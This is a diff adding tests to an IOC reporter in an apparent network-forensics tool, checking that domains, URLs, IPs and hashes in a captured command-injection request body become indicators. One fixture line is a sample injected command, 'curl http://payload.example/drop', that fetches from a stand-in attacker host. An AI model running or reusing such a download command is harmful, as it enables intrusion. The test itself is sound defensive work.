@@ -1,5 +1,7 @@
 """Тесты IOC reporter."""
 
+import base64
+
 from paradox.reporters.ioc_reporter import (
     build_ioc_report,
     render_iocs_csv,
@@ -9,6 +11,23 @@ from paradox.reporters.ioc_reporter import (
     render_suricata_rules,
     write_ioc_files,
 )
+
+
+def _payload_sample(text: str, **extra) -> dict:
+    sample = {
+        "direction": "request",
+        "method": "POST",
+        "host": "victim.local",
+        "uri": "/cmd",
+        "content_type": "text/plain",
+        "size": len(text),
+        "truncated": False,
+        "is_text": True,
+        "sha256": "e" * 64,
+        "text_b64": base64.b64encode(text.encode()).decode("ascii"),
+    }
+    sample.update(extra)
+    return sample
 
 
 def _report_with_findings(*findings):
@@ -41,6 +60,53 @@ def test_ip_from_suspicious_port():
     }))
     assert len(ioc["ips"]) == 1
     assert ioc["ips"][0]["value"] == "203.0.113.66"
+
+
+def test_payload_iocs_are_included():
+    """Домен/URL/IP из тела попадают в IOC, даже если их нет в evidence."""
+    text = (
+        "curl http://payload.example/drop "
+        "connect 203.0.113.9 and 10.0.0.5 "
+        + "f" * 64
+    )
+    ioc = build_ioc_report(_report_with_findings({
+        "type": "command_injection",
+        "value": "10.0.0.5 → /cmd",
+        "severity": "high",
+        "evidence": {"payload_samples": [_payload_sample(text)]},
+    }))
+
+    domains = {item["value"]: item for item in ioc["domains"]}
+    assert "payload.example" in domains
+    assert domains["payload.example"]["source"] == "command_injection:payload"
+    assert "http://payload.example/drop" in {
+        item["value"] for item in ioc["urls"]
+    }
+    ips = {item["value"] for item in ioc["ips"]}
+    assert "203.0.113.9" in ips
+    assert "10.0.0.5" not in ips
+    assert "f" * 64 in {item["value"] for item in ioc["sha256"]}
+
+
+def test_payload_iocs_can_be_disabled():
+    from paradox.config import Config
+
+    ioc = build_ioc_report(
+        _report_with_findings({
+            "type": "command_injection",
+            "value": "x",
+            "severity": "high",
+            "evidence": {
+                "payload_samples": [
+                    _payload_sample("http://payload.example/x"),
+                ],
+            },
+        }),
+        Config(payload_ioc_extraction=False),
+    )
+
+    assert ioc["domains"] == []
+    assert ioc["urls"] == []
 
 
 def test_ip_from_nxdomain_burst():
